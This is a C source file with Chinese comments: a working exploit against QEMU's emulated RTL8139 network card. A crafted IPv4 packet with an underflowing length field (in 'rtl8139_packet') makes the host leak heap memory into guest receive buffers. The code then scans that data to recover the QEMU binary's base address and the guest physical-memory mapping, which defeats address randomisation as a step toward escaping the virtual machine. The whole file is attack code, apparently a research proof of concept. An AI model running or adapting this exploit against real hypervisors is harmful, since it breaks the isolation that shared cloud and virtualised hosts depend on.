#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <unistd.h>

// 页面相关参数
#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN ((1ull << 55) - 1)

// Ethernet Frame 大小
// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)
#define RTL8139_BUFFER_SIZE 1514

// RTL8139 网卡 PMIO 地址
#define RTL8139_PORT 0xc000

// Rx ownership flag
#define CP_RX_OWN (1 << 31)
// w0 end of ring flag
#define CP_RX_EOR (1 << 30)
// Rx buffer size mask 表示 0 ~ 12 位为 buffer size
#define CP_RX_BUFFER_SIZE_MASK ((1 << 13) - 1)

// Tx ownership flag
#define CP_TX_OWN (1 << 31)
// Tx end of ring flag
#define CP_TX_EOR (1 << 30)
// last segment of received packet flag
#define CP_TX_LS (1 << 28)
// large send packet flag
#define CP_TX_LGSEN (1 << 27)
// IP checksum offload flag
#define CP_TX_IPCS (1 << 18)
// TCP checksum offload flag
#define CP_TX_TCPCS (1 << 16)

#define CHUNK_COUNT 0x2000
#define CHUNK_SIZE_MASK ~7ull

// RTL8139 网卡寄存器偏移地址
enum RTL8139_registers {
    TxAddr0 = 0x20,  // Tx descriptors address
    ChipCmd = 0x37,
    TxConfig = 0x40,
    RxConfig = 0x44,
    TxPoll = 0xD9,  // tell chip to check Tx descriptors for work
    CpCmd = 0xE0,   // C+ Command register (C+ mode only)
    // 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址
    RxRingAddrLO = 0xE4,  // 64-bit start addr of Rx descriptor
    RxRingAddrHI = 0xE8,  // 64-bit start addr of Rx descriptor
};

enum RTL_8139_tx_config_bits {
    TxLoopBack = (1 << 18) | (1 << 17),  // enable loopback test mode
};

enum RTL_8139_rx_mode_bits {
    AcceptErr = 0x20,
    AcceptRunt = 0x10,
    AcceptBroadcast = 0x08,
    AcceptMulticast = 0x04,
    AcceptMyPhys = 0x02,
    AcceptAllPhys = 0x01,
};

enum RTL_8139_CplusCmdBits {
    CPlusRxVLAN = 0x0040,   /* enable receive VLAN detagging */
    CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */
    CPlusRxEnb = 0x0002,
    CPlusTxEnb = 0x0001,
};

enum RT8139_ChipCmdBits {
    CmdReset = 0x10,
    CmdRxEnb = 0x08,
    CmdTxEnb = 0x04,
    RxBufEmpty = 0x01,
};

enum RTL8139_TxPollBits {
    CPlus = 0x40,
};

// RTL8139 Rx / Tx descriptor
struct rtl8139_desc {
    uint32_t dw0;
    uint32_t dw1;
    uint32_t buf_lo;
    uint32_t buf_hi;
};

// RTL8139 Rx / Tx ring
struct rtl8139_ring {
    struct rtl8139_desc* desc;
    void* buffer;
};

uint8_t rtl8139_packet[] = {
    // Ethernet Frame Header 数据
    // DST MAC 52:54:00:12:34:57
    0x52, 0x54, 0x00, 0x12, 0x34, 0x57,
    // SRC MAC 52:54:00:12:34:57
    0x52, 0x54, 0x00, 0x12, 0x34, 0x57,
    // Length / Type: IPv4
    0x08, 0x00,

    // Ethernet Frame Payload 数据, 即 IPv4 数据包
    // Version & IHL(Internet Header Length)
    (0x04 << 4) | 0x05,  // 0x05 * 4 = 20 bytes
    0x00,
    // Total Length = 0x13 = 19 bytes
    0x00, 0x13,              // 19 - 20 = -1 = 0xFFFF, trigger vulnerability
    0xde, 0xad,              // Identification
    0x40, 0x00,              // Flags & Fragment Offset
    0x40,                    // TTL
    0x06,                    // Protocol: TCP
    0xde, 0xad,              // Header checksum
    0x7f, 0x00, 0x00, 0x01,  // Source IP: 127.0.0.1
    0x7f, 0x00, 0x00, 0x01,  // Destination IP: 127.0.0.1

    // IP Packet Payload 数据, 即 TCP 数据包
    0xde, 0xad,              // Source Port
    0xbe, 0xef,              // Destination Port
    0x00, 0x00, 0x00, 0x00,  // Sequence Number
    0x00, 0x00, 0x00, 0x00,  // Acknowledgement Number
    0x50,                    // 01010000, Header Length = 5 * 4 = 20
    0x10,                    // 00010000, ACK
    0xde, 0xad,              // Window Size
    0xde, 0xad,              // TCP checksum
    0x00, 0x00               // Urgent Pointer
};

uint64_t get_physical_pfn(void* addr) {
    uint64_t pfn = -1;
    FILE* fp = fopen("/proc/self/pagemap", "rb");
    if (!fp) {
        return pfn;
    }

    if (!fseek(fp, (unsigned long)addr / PAGE_SIZE * 8, SEEK_SET)) {
        fread(&pfn, sizeof(pfn), 1, fp);
        if (pfn & PFN_PRESENT) {
            pfn &= PFN_PFN;
        }
    }
    fclose(fp);
    return pfn;
}

uint64_t gva_to_gpa(void* addr) {
    uint64_t pfn = get_physical_pfn(addr);
    return pfn * PAGE_SIZE + (uint64_t)addr % PAGE_SIZE;
}

void rtl8139_desc_config_rx(struct rtl8139_ring* ring,
                            struct rtl8139_desc* desc,
                            size_t nb) {
    size_t buffer_size = RTL8139_BUFFER_SIZE + 4;
    for (size_t i = 0; i < nb; ++i) {
        memset(&desc[i], 0, sizeof(desc[i]));
        ring[i].desc = &desc[i];

        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);
        memset(ring[i].buffer, 0, buffer_size);

        // descriptor owned by NIC 准备接收数据
        ring[i].desc->dw0 |= CP_RX_OWN;
        if (i == nb - 1) {
            ring[i].desc->dw0 |= CP_RX_EOR;  // End of Ring
        }
        ring[i].desc->dw0 &= ~CP_RX_BUFFER_SIZE_MASK;
        ring[i].desc->dw0 |= buffer_size;  // buffer_size
        ring[i].desc->buf_lo = (uint32_t)gva_to_gpa(ring[i].buffer);
    }

    // Rx descriptors address
    outl((uint32_t)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);
    outl(0, RTL8139_PORT + RxRingAddrHI);
}

void rtl8139_desc_config_tx(struct rtl8139_desc* desc, void* buffer) {
    memset(desc, 0, sizeof(struct rtl8139_desc));
    desc->dw0 |= CP_TX_OWN |  // descriptor owned by NIC 准备发送数据
                 CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN | CP_TX_IPCS | CP_TX_TCPCS;
    desc->dw0 += RTL8139_BUFFER_SIZE;
    desc->buf_lo = (uint32_t)gva_to_gpa(buffer);
    outl((uint32_t)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);
    outl(0, RTL8139_PORT + TxAddr0 + 4);
}

void rtl8139_card_config() {
    // 触发漏洞需要设置的一些参数
    outl(TxLoopBack, RTL8139_PORT + TxConfig);
    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);
    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);
    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);
}

void rtl8139_packet_send(void* buffer, void* packet, size_t len) {
    if (len <= RTL8139_BUFFER_SIZE) {
        memcpy(buffer, packet, len);
        outb(CPlus, RTL8139_PORT + TxPoll);
    }
}

void xxd(uint8_t* ptr, size_t size) {
    for (size_t i = 0, j = 0; i < size; ++i, ++j) {
        if (i % 16 == 0) {
            j = 0;
            printf("\n0x%08x: ", ptr + i);
        }
        printf("%02x ", ptr[i]);
        if (j == 7) {
            printf("- ");
        }
    }
    printf("\n");
}

size_t scan_leaked_chunks(struct rtl8139_ring* ring,
                          size_t ring_count,
                          size_t chunk_size,
                          void** chunks,
                          size_t chunk_count) {
    size_t count = 0;
    for (size_t i = 0; i < ring_count; ++i) {
        // Ethernet Frame Header: 14 +
        // IP Header: 20 +
        // TCP Header: 20 = 54
        uint8_t* ptr = (uint8_t*)ring[i].buffer + 56;
        uint8_t* end = (uint8_t*)ring[i].buffer + RTL8139_BUFFER_SIZE / 4 * 4;
        while (ptr < end) {
            uint64_t size = *(uint64_t*)ptr & CHUNK_SIZE_MASK;
            if (size == chunk_size) {
                chunks[count++] = (void*)(ptr + 8);
            }
            ptr += 4;
            if (count > chunk_count) {
                return count;
            }
        }
    }
    return count;
}

uint64_t leak_module_base_addr(void** chunks, size_t count) {
    const uint64_t property_get_bool_offset = 0x377F66;
    const uint64_t mask = 0x00000FFF;
    for (size_t i = 0; i < count; ++i) {
        uint64_t* ptr = (uint64_t*)chunks[i] + 3;
        if ((*ptr & mask) == (property_get_bool_offset & mask)) {
            printf("property_get_bool: 0x%" PRIx64 "\n", *ptr);
            return *ptr - property_get_bool_offset;
        }
    }
    return -1;
}

uint64_t leak_physical_memory_addr(struct rtl8139_ring* ring,
                                   size_t ring_count) {
    const uint64_t mask = 0xffff000000ull;
    static unsigned short array[0x10000];
    size_t index = 0;
    memset(array, 0, sizeof(array));

    for (size_t i = 0; i < ring_count; ++i) {
        uint8_t* ptr = (uint8_t*)ring[i].buffer + 56;
        uint8_t* end = (uint8_t*)ring[i].buffer + RTL8139_BUFFER_SIZE / 4 * 4;
        while (ptr < end - 8) {
            uint64_t value = *(uint64_t*)ptr;
            if (((value >> 40) & 0xff) == 0x7f) {
                value = (value & mask) >> 24;
                array[value]++;
                if (array[value] > array[index]) {
                    index = value;
                }
            }
            ptr += 4;
        }
    }

    uint64_t memory_size = 0x80000000;
    return (((uint64_t)index | 0x7f0000) << 24) - memory_size;
}

int main(int argc, char** argv) {
    struct rtl8139_ring* rtl8139_rx_ring;
    struct rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc;
    // 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616
    // 可以收完 65535 字节数据
    size_t rtl8139_rx_nb = 44;
    rtl8139_rx_ring = (struct rtl8139_ring*)aligned_alloc(
        PAGE_SIZE, rtl8139_rx_nb * sizeof(struct rtl8139_ring));
    rtl8139_rx_desc = (struct rtl8139_desc*)aligned_alloc(
        PAGE_SIZE, rtl8139_rx_nb * sizeof(struct rtl8139_desc));
    rtl8139_tx_desc = (struct rtl8139_desc*)aligned_alloc(
        PAGE_SIZE, sizeof(struct rtl8139_desc));
    void* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);

    // change I/O privilege level
    iopl(3);

    // initialize Rx ring, Rx descriptor, Tx descriptor
    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);
    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);
    rtl8139_card_config();
    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet,
                        sizeof(rtl8139_packet));
    sleep(2);

    // print leaked data
    for (size_t i = 0; i < rtl8139_rx_nb; ++i) {
        // RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum
        // 不打印也无所谓了
        xxd((uint8_t*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
    }

    // exploit
    void* chunks[CHUNK_COUNT] = {0};
    size_t chunk_count = scan_leaked_chunks(rtl8139_rx_ring, rtl8139_rx_nb,
                                            0x60, chunks, CHUNK_COUNT);
    uint64_t module_addr = leak_module_base_addr(chunks, chunk_count);
    printf("qemu-system-x86_64: 0x%" PRIx64 "\n", module_addr);
    uint64_t physical_memory_addr
        = leak_physical_memory_addr(rtl8139_rx_ring, rtl8139_rx_nb);
    printf("physical memory address: 0x%" PRIx64 "\n", physical_memory_addr);

    // TODO: free heap blocks

    return 0;
}
